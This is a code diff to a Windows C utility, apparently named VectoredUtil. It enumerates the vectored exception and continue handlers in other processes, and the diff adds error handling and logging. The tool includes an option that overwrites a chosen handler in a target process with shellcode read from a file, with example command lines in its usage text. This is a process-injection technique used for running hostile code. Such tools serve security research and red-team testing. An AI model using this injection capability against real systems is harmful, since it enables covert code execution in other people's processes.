@@ -1,6 +1,10 @@
 #include "header.h"
 #include <stdio.h>
 
+#pragma warning(disable : 4024)
+#pragma warning(disable : 4047)
+#pragma warning(disable : 4133)
+
 GLOBAL Global = { 0 };
 
 PVOID DecodePointerRemote(PVOID pointer, DWORD cookie) {
@@ -18,7 +22,16 @@ NTSTATUS EnableDebug() {
 
 	fnRtlAdjustPrivilege pRtlAdjustPrivilege = (fnRtlAdjustPrivilege)GetProcAddress(Global.pNtdll, "RtlAdjustPrivilege");
 
-	STATUS = pRtlAdjustPrivilege(0x20, TRUE, FALSE, &bOldPriv);
+	if (!pRtlAdjustPrivilege) {
+		return STATUS_ASSERTION_FAILURE;
+	}
+
+	STATUS = pRtlAdjustPrivilege(20, TRUE, FALSE, &bOldPriv);
+
+	if (!NT_SUCCESS(STATUS)) {
+		printf("[!] RtlAdjustPrivilege failed: 0x%0.8X\n", STATUS);
+		return STATUS;
+	}
 
 	return STATUS;
 }
@@ -136,6 +149,11 @@ BOOL OverWriteHandler(HANDLE hProc, PVOID pHandlerEntry, DWORD dwCookie) {
 	fnNtCreateSection	 pNtCreateSection = (fnNtCreateSection)GetProcAddress(Global.pNtdll, "NtCreateSection");
 	fnNtMapViewOfSection pNtMapViewOfSection = (fnNtMapViewOfSection)GetProcAddress(Global.pNtdll, "NtMapViewOfSection");
 
+	if (!pNtCreateSection || !pNtMapViewOfSection) {
+		printf("[!] Error getting functions\n");
+		return FALSE;
+	}
+
 	HANDLE hFile = CreateFileW(Global.lpPayload, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 
 	if (hFile == NULL || hFile == INVALID_HANDLE_VALUE) {
@@ -208,11 +226,11 @@ BOOL VerifyHandler(HANDLE hProc, int type, int idx) {
 
 	if (type > 1 || type < 0) {
 		printf("[!] Wrong type specified, you specified: %d\n", type);
-		return;
+		return FALSE;
 	}
 
 	if (!ReadProcessMemory(hProc, Global.pHandlerList, &handler_list, sizeof(VECTORED_HANDLER_LIST), NULL)) {
-		printf("[!] Error getting VEH list: %ld\n", GetLastError());
+		printf("[!] Failed to get handler list for PID: %d\n", GetProcessId(hProc));
 		return FALSE;
 	}
 
@@ -325,7 +343,7 @@ NTSTATUS EnumAll(int type) {
 		}
 
 		if (VerifyHandler(hTarget, type, 0)) {
-			wprintf(L"[+] Process: %ls\n", pProcInfo->ImageName.Buffer);
+			wprintf(L"[+] Process: %ls - %d\n", pProcInfo->ImageName.Buffer, pProcInfo->UniqueProcessId);
 		}
 
 		if (!pProcInfo->NextEntryOffset)
@@ -350,7 +368,7 @@ int wmain() {
 
 	if (argc <= 1) {
 		printf("\n-debug: Enable SeDebug\n-proc <pid>: Enum both VCH & VEH in a given process\n-enum-vch: Enum all processes with VCH(s)\n-enum-veh: Enum all processes with VEH(s)\n-dump <bytes>: Dump X bytes of found handler function(s) in a given process (use -proc)\n");
-		printf("-overwrite <type> <index> <payload_file>: Overwrite VEH (type 0)/VCH (type 1) at specified index (1 is first handler and so on) in a given process (use -proc) with specified shellcode\n\n");
+		printf("-overwrite <type> <index> <payload_file>: Overwrite VEH (type 0)/VCH (type 1) at specified index (1 is first handler and so on) in a given process with specified shellcode\n\n");
 		printf("Example1: VectoredUtil.exe -proc 1220 -dump 100\n");
 		printf("Example2: VectoredUtil.exe -proc 1220 -overwrite 0 1 C:\\payload.bin\n");
 		printf("Example3: VectoredUtil.exe -enum-veh\n");
@@ -375,7 +393,6 @@ int wmain() {
 			STATUS = EnableDebug();
 
 			if (!NT_SUCCESS(STATUS)) {
-				printf("[!] Error setting SeDebug: 0x%0.8X\n", STATUS);
 				return -1;
 			}
 		}
